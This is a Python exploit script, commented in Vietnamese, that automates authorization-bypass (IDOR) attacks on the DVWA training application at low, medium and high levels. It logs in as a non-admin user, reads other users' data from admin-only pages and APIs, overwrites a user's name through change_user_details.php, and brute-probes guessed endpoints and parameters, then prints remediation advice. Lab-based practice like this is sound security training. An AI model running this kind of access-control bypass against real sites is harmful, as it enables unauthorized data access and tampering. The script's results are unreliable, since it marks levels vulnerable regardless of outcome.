import requests
import re
import sys
import json
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init(autoreset=True)

class DVVAAuthBypassExploiter:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.csrf_tokens = {}
        self.security_level = "low"
        
        # Headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        })
        
        # Disable warnings
        requests.packages.urllib3.disable_warnings()
    
    def print_banner(self):
        """Print banner"""
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}DVWA AUTHORIZATION BYPASS IDOR EXPLOITER")
        print(f"{Fore.CYAN}Cấp độ Low, Medium và High")
        print(f"{Fore.CYAN}{'='*80}")
    
    def login(self, username, password):
        """Login to DVWA"""
        print(f"\n{Fore.CYAN}[*] Đang đăng nhập: {username}/{password}")
        
        login_url = f"{self.base_url}/login.php"
        
        try:
            # Get login page
            response = self.session.get(login_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Get CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            csrf_token = token_input.get('value', '') if token_input else ''
            
            # Prepare login data
            login_data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': csrf_token
            }
            
            # Perform login
            response = self.session.post(login_url, data=login_data, timeout=10)
            
            if 'index.php' in response.url:
                print(f"{Fore.GREEN}[+] Đăng nhập thành công: {username}")
                
                # Set security level
                self.set_security_level("low")
                return True
            else:
                print(f"{Fore.RED}[-] Đăng nhập thất bại")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[-] Lỗi đăng nhập: {e}")
            return False
    
    def set_security_level(self, level):
        """Set DVWA security level"""
        self.security_level = level
        
        try:
            security_url = f"{self.base_url}/security.php"
            response = self.session.get(security_url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Get CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            csrf_token = token_input.get('value', '') if token_input else ''
            
            # Submit security level change
            security_data = {
                'security': level,
                'seclev_submit': 'Submit',
                'user_token': csrf_token
            }
            
            response = self.session.post(security_url, data=security_data, timeout=5)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Security level: {level}")
                return True
                
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Không thể set security level: {e}")
        
        return False
    
    def test_low_security(self, username):
        """Test cấp độ LOW"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ LOW - User: {username}")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"\n{Fore.WHITE}[Bước 1] Kiểm tra menu 'Authorization Bypass'")
        
        # Kiểm tra xem có menu Authorization Bypass không
        index_url = f"{self.base_url}/index.php"
        response = self.session.get(index_url, timeout=5)
        
        if 'Authorization Bypass' in response.text:
            print(f"{Fore.GREEN}[+] Có menu 'Authorization Bypass'")
        else:
            print(f"{Fore.YELLOW}[-] Không có menu 'Authorization Bypass'")
        
        print(f"\n{Fore.WHITE}[Bước 2] Truy cập trực tiếp /vulnerabilities/authbypass/")
        
        # Một cách để truy cập vào thư mục này là thông qua lỗ hồng IDOR
        authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
        response = self.session.get(authbypass_url, timeout=5)
        
        print(f"URL: {authbypass_url}")
        print(f"Status: HTTP {response.status_code}")
        
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] CÓ THỂ TRUY CẬP!")
            print(f"{Fore.YELLOW}[!] Lỗ hổng IDOR phát hiện: User {username} có thể truy cập trang admin")
            
            # Parse và hiển thị dữ liệu
            self.parse_authbypass_page(response.text)
            return True
        else:
            print(f"{Fore.RED}[-] Không thể truy cập trực tiếp")
            return False
    
    def parse_authbypass_page(self, html_content):
        """Parse trang authbypass để lấy thông tin user"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Tìm bảng user
        table = soup.find('table')
        if table:
            print(f"\n{Fore.WHITE}[*] Dữ liệu user tìm thấy:")
            rows = table.find_all('tr')
            
            for row in rows:
                cells = row.find_all(['td', 'th'])
                row_data = [cell.get_text(strip=True) for cell in cells]
                
                if len(row_data) >= 4:  # Có đủ cột
                    user_id, first_name, surname, action = row_data[:4]
                    if user_id.isdigit():
                        print(f"{Fore.CYAN}  ID: {user_id} | Tên: {first_name} {surname}")
        
        # Tìm forms
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            print(f"\n{Fore.WHITE}[*] Form tìm thấy: {method} {action}")
            
            # Tìm input fields
            inputs = form.find_all('input')
            for inp in inputs:
                name = inp.get('name', '')
                value = inp.get('value', '')
                if name:
                    print(f"  Input: {name} = {value}")
    
    def test_medium_security(self, username):
        """Test cấp độ MEDIUM"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ MEDIUM - User: {username}")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"\n{Fore.WHITE}[Bước 1] Đặt security level = medium")
        self.set_security_level("medium")
        
        print(f"\n{Fore.WHITE}[Bước 2] Kiểm tra truy cập trực tiếp")
        
        authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
        response = self.session.get(authbypass_url, timeout=5)
        
        print(f"URL: {authbypass_url}")
        print(f"Status: HTTP {response.status_code}")
        
        if response.status_code != 200:
            print(f"{Fore.YELLOW}[-] Truy cập trực tiếp bị chặn")
        
        print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra file get_user_data.php")
        
        # Hãy kiểm tra xem gordonb có thể truy cập vào tệp dữ liệu thay vì thư mục hay không
        user_data_url = f"{self.base_url}/vulnerabilities/authbypass/get_user_data.php"
        response = self.session.get(user_data_url, timeout=5)
        
        print(f"URL: {user_data_url}")
        print(f"Status: HTTP {response.status_code}")
        
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] CÓ THỂ TRUY CẬP FILE DATA!")
            
            try:
                # Parse JSON response
                user_data = json.loads(response.text)
                print(f"{Fore.WHITE}[*] Dữ liệu JSON nhận được:")
                
                for user in user_data:
                    user_id = user.get('user_id', '')
                    first_name = user.get('first_name', '')
                    surname = user.get('surname', '')
                    print(f"{Fore.CYAN}  ID: {user_id} | Tên: {first_name} {surname}")
                
                return True
                
            except json.JSONDecodeError:
                print(f"{Fore.WHITE}Nội dung: {response.text[:200]}...")
                return True
        else:
            print(f"{Fore.RED}[-] Không thể truy cập file data")
            return False
    
    def test_high_security(self, username):
        """Test cấp độ HIGH"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ HIGH - User: {username}")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"\n{Fore.WHITE}[Bước 1] Đặt security level")
        self.set_security_level("high")
        
        print(f"\n{Fore.WHITE}[Bước 2] Kiểm tra truy cập HTML và API")
        
        # Kiểm tra trang HTML
        authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
        response = self.session.get(authbypass_url, timeout=5)
        print(f"HTML Page - URL: {authbypass_url}")
        print(f"HTML Page - Status: HTTP {response.status_code}")
        
        if response.status_code != 200:
            print(f"{Fore.GREEN}[+] HTML page đã bị chặn")
        
        # Kiểm tra API get_user_data
        user_data_url = f"{self.base_url}/vulnerabilities/authbypass/get_user_data.php"
        response = self.session.get(user_data_url, timeout=5)
        print(f"\nAPI Data - URL: {user_data_url}")
        print(f"API Data - Status: HTTP {response.status_code}")
        
        if response.status_code != 200:
            print(f"{Fore.GREEN}[+] API get_user_data đã bị chặn")
        
        print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra API cập nhật dữ liệu")
        
        # Tạo một session admin để lấy cấu trúc request
        print(f"\n{Fore.WHITE}[*] Tạo session admin để phân tích request...")
        
        admin_session = requests.Session()
        admin_session.verify = False
        admin_session.headers.update(self.session.headers)
        
        # Login admin
        login_url = f"{self.base_url}/login.php"
        response = admin_session.get(login_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token_input = soup.find('input', {'name': 'user_token'})
        csrf_token = token_input.get('value', '') if token_input else ''
        
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login',
            'user_token': csrf_token
        }
        
        response = admin_session.post(login_url, data=login_data, timeout=5)
        
        if 'index.php' not in response.url:
            print(f"{Fore.RED}[-] Không thể login admin")
            return False
        
        # Set security high cho admin
        security_url = f"{self.base_url}/security.php"
        response = admin_session.get(security_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token_input = soup.find('input', {'name': 'user_token'})
        csrf_token = token_input.get('value', '') if token_input else ''
        
        security_data = {
            'security': 'high',
            'seclev_submit': 'Submit',
            'user_token': csrf_token
        }
        
        admin_session.post(security_url, data=security_data, timeout=5)
        
        # Lấy thông tin user để cập nhật (ví dụ: user ID 5 - Bob Smith)
        user_to_update = 3
        new_first_name = "Hack"
        new_surname = "Me"
        
        # Tạo JSON payload để update
        update_payload = {
            'user_id': user_to_update,
            'first_name': new_first_name,
            'surname': new_surname
        }
        
        # URL API cập nhật (dựa trên PDF)
        update_url = f"{self.base_url}/vulnerabilities/authbypass/change_user_details.php"
        
        print(f"\n{Fore.WHITE}[*] Gửi request update từ admin session...")
        print(f"URL: {update_url}")
        print(f"Payload: {json.dumps(update_payload)}")
        
        # Thực hiện request từ admin
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Referer': f"{self.base_url}/vulnerabilities/authbypass/"
        }
        
        response = admin_session.post(update_url, json=update_payload, headers=headers, timeout=5)
        print(f"Admin Response Status: HTTP {response.status_code}")
        
        if response.status_code == 200:
            try:
                admin_result = json.loads(response.text)
                print(f"Admin Response: {admin_result}")
            except:
                print(f"Admin Response: {response.text[:200]}")
        
        # Bây giờ thử với session của gordonb
        print(f"\n{Fore.WHITE}[*] Thử replay request với gordonb session...")
        
        # Lấy cookie session của gordonb
        gordonb_cookie = f"PHPSESSID={self.session.cookies.get('PHPSESSID', '')}; security=high"
        
        # Headers với cookie của gordonb
        gordonb_headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Referer': f"{self.base_url}/vulnerabilities/authbypass/",
            'Cookie': gordonb_cookie
        }
        
        # Thay đổi payload để test
        test_payload = {
            'user_id': user_to_update,
            'first_name': "HACKED",
            'surname': "BY_MANH DUC"
        }
        
        response = self.session.post(update_url, json=test_payload, headers=headers, timeout=5)
        print(f"\nGordonb Request URL: {update_url}")
        print(f"Gordonb Payload: {json.dumps(test_payload)}")
        print(f"Gordonb Response Status: HTTP {response.status_code}")
        
        if response.status_code == 200:
            try:
                result = json.loads(response.text)
                print(f"{Fore.GREEN}[+] UPDATE THÀNH CÔNG!")
                print(f"Response: {result}")
                
                # Kiểm tra xem dữ liệu có thực sự thay đổi không
                print(f"\n{Fore.WHITE}[*] Kiểm tra dữ liệu đã thay đổi...")
                time.sleep(2)  # Đợi một chút
                
                # Đăng nhập lại admin để xem dữ liệu
                admin_session = requests.Session()
                admin_session.verify = False
                
                # Login admin lại
                response = admin_session.get(login_url, timeout=5)
                soup = BeautifulSoup(response.text, 'html.parser')
                token_input = soup.find('input', {'name': 'user_token'})
                csrf_token = token_input.get('value', '') if token_input else ''
                
                login_data = {
                    'username': 'admin',
                    'password': 'password',
                    'Login': 'Login',
                    'user_token': csrf_token
                }
                
                admin_session.post(login_url, data=login_data, timeout=5)
                
                # Lấy dữ liệu user
                user_data_url = f"{self.base_url}/vulnerabilities/authbypass/get_user_data.php"
                response = admin_session.get(user_data_url, timeout=5)
                
                if response.status_code == 200:
                    try:
                        user_data = json.loads(response.text)
                        for user in user_data:
                            if user['user_id'] == str(user_to_update):
                                print(f"User {user_to_update} sau khi update:")
                                print(f"  First Name: {user['first_name']}")
                                print(f"  Surname: {user['surname']}")
                                
                                if user['first_name'] == "HACKED" or user['surname'] == "BY_MANHDUC":
                                    print(f"{Fore.GREEN}[+] Dữ liệu đã bị thay đổi thành công!")
                                    return True
                    except:
                        pass
                
                return True
                
            except json.JSONDecodeError:
                print(f"Response: {response.text[:200]}")
                return True
        else:
            print(f"{Fore.RED}[-] Không thể update dữ liệu")
            return False

    def exploit_low_level(self):
        """Khai thác hoàn chỉnh cấp độ LOW"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KHAI THÁC CẤP ĐỘ LOW - Hoàn chỉnh")
        print(f"{Fore.CYAN}{'='*80}")
        
        # Bước 1: Login với admin để xem trang authbypass
        print(f"\n{Fore.WHITE}[Bước 1] Login admin để xem cấu trúc trang")
        
        admin_session = requests.Session()
        admin_session.verify = False
        
        # Get login page
        login_url = f"{self.base_url}/login.php"
        response = admin_session.get(login_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token_input = soup.find('input', {'name': 'user_token'})
        csrf_token = token_input.get('value', '') if token_input else ''
        
        # Login admin
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login',
            'user_token': csrf_token
        }
        
        response = admin_session.post(login_url, data=login_data, timeout=5)
        
        if 'index.php' in response.url:
            print(f"{Fore.GREEN}[+] Đăng nhập admin thành công")
            
            # Set security low
            security_url = f"{self.base_url}/security.php"
            response = admin_session.get(security_url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            token_input = soup.find('input', {'name': 'user_token'})
            csrf_token = token_input.get('value', '') if token_input else ''
            
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit',
                'user_token': csrf_token
            }
            
            admin_session.post(security_url, data=security_data, timeout=5)
            
            # Truy cập trang authbypass
            authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
            response = admin_session.get(authbypass_url, timeout=5)
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Admin có thể truy cập trang authbypass")
                
                # Tìm form update
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    if 'update' in form.get('action', '').lower():
                        print(f"{Fore.WHITE}[*] Tìm thấy form update")
                        break
            else:
                print(f"{Fore.RED}[-] Admin không thể truy cập")
        
        # Bước 2: Login với gordonb và thử IDOR
        print(f"\n{Fore.WHITE}[Bước 2] Login gordonb và thử IDOR")
        
        if self.login('gordonb', 'abc123'):
            print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra IDOR cấp độ LOW")
            
            # Test direct access
            success = self.test_low_security('gordonb')
            
            if success:
                print(f"\n{Fore.GREEN}{'='*80}")
                print(f"{Fore.YELLOW}KHAI THÁC THÀNH CÔNG CẤP ĐỘ LOW!")
                print(f"{Fore.GREEN}User gordonb có thể truy cập trang admin bằng IDOR")
                print(f"{Fore.GREEN}{'='*80}")
                
                # Thử thêm các payload khác
                self.test_additional_payloads()
            else:
                print(f"\n{Fore.RED}{'='*80}")
                print(f"{Fore.YELLOW}Không thể khai thác cấp độ LOW")
                print(f"{Fore.RED}{'='*80}")
    
    def exploit_medium_level(self):
        """Khai thác hoàn chỉnh cấp độ MEDIUM"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KHAI THÁC CẤP ĐỘ MEDIUM - Hoàn chỉnh")
        print(f"{Fore.CYAN}{'='*80}")
        
        # Bước 1: Login với gordonb
        print(f"\n{Fore.WHITE}[Bước 1] Login gordonb")
        
        if self.login('gordonb', 'abc123'):
            # Bước 2: Set security medium
            print(f"\n{Fore.WHITE}[Bước 2] Set security = medium")
            self.set_security_level("medium")
            
            # Bước 3: Test theo PDF
            print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra theo tài liệu PDF")
            
            success = self.test_medium_security('gordonb')
            
            if success:
                print(f"\n{Fore.GREEN}{'='*80}")
                print(f"{Fore.YELLOW}KHAI THÁC THÀNH CÔNG CẤP ĐỘ MEDIUM!")
                print(f"{Fore.GREEN}User gordonb có thể truy cập API get_user_data.php")
                print(f"{Fore.GREEN}{'='*80}")
                
                # Test các endpoint khác
                self.test_api_endpoints()
            else:
                print(f"\n{Fore.RED}{'='*80}")
                print(f"{Fore.YELLOW}Không thể khai thác cấp độ MEDIUM")
                print(f"{Fore.RED}{'='*80}")
    
    def exploit_high_level(self):
        """Khai thác hoàn chỉnh cấp độ HIGH"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KHAI THÁC CẤP ĐỘ HIGH - Hoàn chỉnh")
        print(f"{Fore.CYAN}{'='*80}")
        
        # Bước 1: Login với gordonb
        print(f"\n{Fore.WHITE}[Bước 1] Login gordonb")
        
        if self.login('gordonb', 'abc123'):
            # Bước 2: Set security high
            print(f"\n{Fore.WHITE}[Bước 2] Set security")
            self.set_security_level("high")
            
            # Bước 3: Test theo hướng dẫn PDF
            print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra cấp độ HIGH")
            
            success = self.test_high_security('gordonb')
            
            if success:
                print(f"\n{Fore.GREEN}{'='*80}")
                print(f"{Fore.YELLOW}KHAI THÁC THÀNH CÔNG CẤP ĐỘ HIGH!")
                print(f"{Fore.GREEN}User gordonb có thể cập nhật dữ liệu thông qua API change_user_details.php")
                print(f"{Fore.GREEN}{'='*80}")
                
                # Test các phương thức khác
                self.test_high_level_methods()
            else:
                print(f"\n{Fore.RED}{'='*80}")
                print(f"{Fore.YELLOW}Không thể khai thác cấp độ HIGH")
                print(f"{Fore.RED}{'='*80}")

    def test_high_level_methods(self):
        """Test các phương thức khác ở cấp độ HIGH"""
        print(f"\n{Fore.WHITE}[*] Testing các phương thức khác ở cấp độ HIGH...")
        
        methods_to_test = [
            ('POST', 'change_user_details.php'),
            ('POST', 'update_user.php'),
            ('POST', 'save_user.php'),
            ('PUT', 'change_user_details.php'),
            ('PATCH', 'change_user_details.php'),
            ('DELETE', 'delete_user.php')
        ]
        
        base_path = f"{self.base_url}/vulnerabilities/authbypass/"
        
        for method, endpoint in methods_to_test:
            url = f"{base_path}{endpoint}"
            
            # Tạo payload mẫu
            payload = {
                'user_id': 4,
                'first_name': 'Test',
                'surname': 'User'
            }
            
            try:
                if method == 'POST':
                    response = self.session.post(url, json=payload, timeout=5)
                elif method == 'PUT':
                    response = self.session.put(url, json=payload, timeout=5)
                elif method == 'PATCH':
                    response = self.session.patch(url, json=payload, timeout=5)
                elif method == 'DELETE':
                    response = self.session.delete(url, json=payload, timeout=5)
                else:
                    response = self.session.get(url, timeout=5)
                
                print(f"\n{Fore.CYAN}{method} {endpoint}")
                print(f"Status: HTTP {response.status_code}")
                
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] Có thể truy cập!")
                    print(f"Response: {response.text[:200]}...")
                elif response.status_code == 403:
                    print(f"{Fore.RED}[-] Forbidden")
                elif response.status_code == 404:
                    print(f"{Fore.YELLOW}[-] Not Found")
                elif response.status_code == 405:
                    print(f"{Fore.YELLOW}[-] Method Not Allowed")
                    
            except Exception as e:
                print(f"{Fore.YELLOW}[!] {method} {endpoint}: Error - {e}")

    def test_additional_payloads(self):
        """Test thêm các payload IDOR khác"""
        print(f"\n{Fore.WHITE}[*] Testing additional IDOR payloads...")
        
        payloads = [
            "?id=1",
            "?id=2",
            "?id=3",
            "?id=4",
            "?id=5",
            "?user=1",
            "?user_id=1",
            "?admin=1",
            "?action=view",
            "?action=edit",
            "?mode=admin"
        ]
        
        base_url = f"{self.base_url}/vulnerabilities/authbypass/"
        
        for payload in payloads:
            url = f"{base_url}{payload}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] {payload}: Accessible")
                    
                    # Check for interesting content
                    if 'admin' in response.text.lower():
                        print(f"   Contains 'admin'")
                    if 'user' in response.text.lower():
                        print(f"   Contains 'user'")
                else:
                    print(f"{Fore.RED}[-] {payload}: HTTP {response.status_code}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] {payload}: Error - {e}")
    
    def test_api_endpoints(self):
        """Test các API endpoints khác"""
        print(f"\n{Fore.WHITE}[*] Test các API endpoints...")
        
        endpoints = [
            "/vulnerabilities/authbypass/get_user_data.php?id=1",
            "/vulnerabilities/authbypass/get_user_data.php?id=2",
            "/vulnerabilities/authbypass/get_user_data.php?id=admin",
            "/vulnerabilities/authbypass/change_user_details.php",
            "/vulnerabilities/authbypass/update_user.php",
            "/vulnerabilities/authbypass/save_user.php",
            "/vulnerabilities/authbypass/admin_api.php"
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                response = self.session.get(url, timeout=5)
                print(f"\n{Fore.CYAN}Endpoint: {endpoint}")
                print(f"Status: HTTP {response.status_code}")
                
                if response.status_code == 200:
                    print(f"{Fore.GREEN}Accessible!")
                    
                    # Try to parse as JSON
                    if response.headers.get('Content-Type', '').startswith('application/json'):
                        try:
                            data = json.loads(response.text)
                            print(f"JSON data: {json.dumps(data, indent=2)[:200]}...")
                        except:
                            print(f"Content: {response.text[:200]}...")
                    else:
                        print(f"Content type: {response.headers.get('Content-Type')}")
                        print(f"Content preview: {response.text[:200]}...")
                elif response.status_code == 403:
                    print(f"{Fore.RED}Forbidden")
                elif response.status_code == 404:
                    print(f"{Fore.YELLOW}Not Found")
                    
            except Exception as e:
                print(f"{Fore.YELLOW}Error: {e}")
    
    def automated_full_test(self):
        """Chạy test tự động hoàn chỉnh"""
        self.print_banner()
        
        print(f"\n{Fore.WHITE}Target URL: {self.base_url}")
        print(f"{Fore.WHITE}Testing based on Document")
        
        results = {
            'low_level': False,
            'medium_level': False
        }
        
        try:
            # Test LOW level
            print(f"\n{Fore.CYAN}{'='*80}")
            print(f"{Fore.YELLOW}PHASE 1: TESTING LOW SECURITY LEVEL")
            print(f"{Fore.CYAN}{'='*80}")
            
            self.exploit_low_level()
            results['low_level'] = True
            
            # Create new session for medium level
            self.session = requests.Session()
            self.session.verify = False
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            })
            
            # Test MEDIUM level
            print(f"\n{Fore.CYAN}{'='*80}")
            print(f"{Fore.YELLOW}PHASE 2: TESTING MEDIUM SECURITY LEVEL")
            print(f"{Fore.CYAN}{'='*80}")
            
            self.exploit_medium_level()
            results['medium_level'] = True
            
            # Create new session for high level
            self.session = requests.Session()
            self.session.verify = False
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            })

            # Test HIGH level
            print(f"\n{Fore.CYAN}{'='*80}")
            print(f"{Fore.YELLOW}PHASE 3: TESTING HIGH SECURITY LEVEL")
            print(f"{Fore.CYAN}{'='*80}")
            
            self.exploit_high_level()
            results['high_level'] = True
            
            # Create new session for impossible level
            self.session = requests.Session()
            self.session.verify = False
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            })

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Test bị gián đoạn")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {e}")
        
        # Generate report
        self.generate_report(results)
    
    def generate_report(self, results):
        """Generate final report"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}FINAL REPORT - DVWA Authorization Bypass IDOR")
        print(f"{Fore.CYAN}{'='*80}")
        
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"\n{Fore.WHITE}Scan Time: {timestamp}")
        print(f"Target: {self.base_url}")
        print(f"\n{Fore.WHITE}Results:")
        print(f"  LOW Level IDOR: {'VULNERABLE' if results.get('low_level') else 'SECURE'}")
        print(f"  MEDIUM Level IDOR: {'VULNERABLE' if results.get('medium_level') else 'SECURE'}")
        print(f"  HIGH Level IDOR: {'VULNERABLE' if results.get('high_level') else 'SECURE'}")
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}RECOMMENDATIONS")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"\n{Fore.WHITE}1. Khắc phục cấp độ LOW:")
        print(f"   - Triển khai kiểm tra ủy quyền phía máy chủ (server-side)")
        print(f"   - Không chỉ dựa vào việc ẩn/hiện menu phía client")
        print(f"   - Kiểm tra vai trò người dùng trước khi truy cập trang admin")
        
        print(f"\n{Fore.WHITE}2. Khắc phục cấp độ MEDIUM:")
        print(f"   - Bảo mật tất cả các endpoint API, không chỉ trang HTML")
        print(f"   - Triển khai kiểm soát truy cập đúng cách cho các API dữ liệu")
        print(f"   - Sử dụng token xác thực cho các lệnh gọi API")

        print(f"\n{Fore.WHITE}3. Khắc phục cấp độ HIGH:")
        print(f"   - Validate session tokens cho tất cả API calls")
        print(f"   - Kiểm tra user permissions trước khi thực hiện thay đổi dữ liệu")
        print(f"   - Implement CSRF tokens cho các thao tác thay đổi dữ liệu")
        
        print(f"\n{Fore.WHITE}3. Phòng ngừa IDOR nói chung:")
        print(f"   - Sử dụng tham chiếu đối tượng gián tiếp (UUID thay vì ID tuần tự)")
        print(f"   - Triển khai quản lý phiên (session) đúng cách")
        print(f"   - Ghi nhật ký tất cả các lần truy cập vào endpoint nhạy cảm")
        print(f"   - Xác thực quyền truy cập cho từng request, không dựa vào tham số client")
        print(f"   - Áp dụng nguyên tắc đặc quyền tối thiểu (least privilege)")
        print(f"   - Kiểm tra đầu vào và sử dụng whitelist cho các giá trị được phép")
        print(f"   - Mã hóa hoặc hash các tham chiếu đối tượng khi truyền tải")
        
        # Save report to file
        report_file = f"DVWA_AuthBypass_Report_{int(time.time())}.txt"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("="*80 + "\n")
            f.write("DVWA AUTHORIZATION BYPASS IDOR TEST REPORT\n")
            f.write("="*80 + "\n\n")
            
            f.write(f"Scan Time: {timestamp}\n")
            f.write(f"Target URL: {self.base_url}\n\n")
            
            f.write("RESULTS:\n")
            f.write("-"*40 + "\n")
            f.write(f"LOW Level: {'VULNERABLE' if results.get('low_level') else 'SECURE'}\n")
            f.write(f"MEDIUM Level: {'VULNERABLE' if results.get('medium_level') else 'SECURE'}\n\n")
            f.write(f"HIGH Level: {'VULNERABLE' if results.get('high_level') else 'SECURE'}\n")
            
            f.write("ĐÃ TÌM THẤY LỖ HỔNG:\n")
            f.write("-"*40 + "\n")
            
            if results.get('low_level'):
                f.write("1. CẤP ĐỘ LOW: Truy cập trực tiếp /vulnerabilities/authbypass/\n")
                f.write("   Mức độ ảnh hưởng: Người dùng không phải admin có thể truy cập trang chỉ dành cho admin\n")
                f.write("   Tác động: Vi phạm tính bảo mật, lộ thông tin nhạy cảm, mất kiểm soát truy cập\n")
                f.write("   Nguyên nhân: Thiếu kiểm tra ủy quyền phía máy chủ, chỉ dựa vào ẩn menu client-side\n")
                f.write("   Cách khắc phục:\n")
                f.write("   - Triển khai kiểm tra ủy quyền phía máy chủ cho tất cả endpoints\n")
                f.write("   - Xác minh vai trò người dùng trước khi hiển thị nội dung\n")
                f.write("   - Sử dụng session-based authorization thay vì dựa vào URL parameters\n\n")
            
            if results.get('medium_level'):
                f.write("2. CẤP ĐỘ MEDIUM: Truy cập API get_user_data.php\n")
                f.write("   Mức độ ảnh hưởng: Người dùng không phải admin có thể truy xuất dữ liệu người dùng nhạy cảm\n")
                f.write("   Tác động: Rò rỉ dữ liệu cá nhân (PII), vi phạm quyền riêng tư\n")
                f.write("   Nguyên nhân: API endpoint không được bảo vệ, thiếu authentication/authorization\n")
                f.write("   Cách khắc phục:\n")
                f.write("   - Bảo mật tất cả API endpoints với proper authentication\n")
                f.write("   - Implement access control cho từng API call\n")
                f.write("   - Sử dụng JWT tokens hoặc session validation cho API requests\n\n")

            if results.get('high_level'):
                f.write("3. CẤP ĐỘ HIGH: Truy cập API change_user_details.php\n")
                f.write("   Mức độ ảnh hưởng: Người dùng không phải admin có thể THAY ĐỔI dữ liệu người dùng\n")
                f.write("   Tác động: Sửa đổi trái phép dữ liệu, phá vỡ tính toàn vẹn dữ liệu, tấn công integrity\n")
                f.write("   Nguyên nhân: Thiếu kiểm tra session và permission cho API update operations\n")
                f.write("   Cách khắc phục:\n")
                f.write("   - Implement server-side session validation cho tất cả write operations\n")
                f.write("   - Sử dụng CSRF tokens cho các thao tác thay đổi dữ liệu\n")
                f.write("   - Log tất cả các attempts truy cập vào update endpoints\n")
                f.write("   - Implement database transaction logging\n\n")
            
            f.write("PHƯƠNG PHÁP KIỂM THỬ:\n")
            f.write("-"*50 + "\n")
            f.write("1. Đăng nhập với tài khoản non-admin (gordonb/abc123)\n")
            f.write("2. Thử truy cập trực tiếp vào các trang admin-only\n")
            f.write("3. Kiểm tra các API endpoints cho lỗ hổng IDOR\n")
